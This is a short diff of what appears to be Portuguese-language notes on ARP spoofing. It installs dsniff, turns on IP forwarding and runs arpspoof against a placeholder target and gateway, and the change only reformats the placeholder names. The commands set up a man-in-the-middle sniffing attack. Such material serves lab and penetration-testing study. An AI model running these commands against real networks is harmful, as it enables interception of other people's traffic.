@@ -7,4 +7,4 @@ sudo apt install dsniff
 sudo echo 1 > /proc/sys/net/ipv4/ip_forward
 
 # sniffando
-arpspoof -i <interface> -t <IP alvo> <IP gateway>
+arpspoof -i <interface> -t <IP_alvo> <IP_gateway>
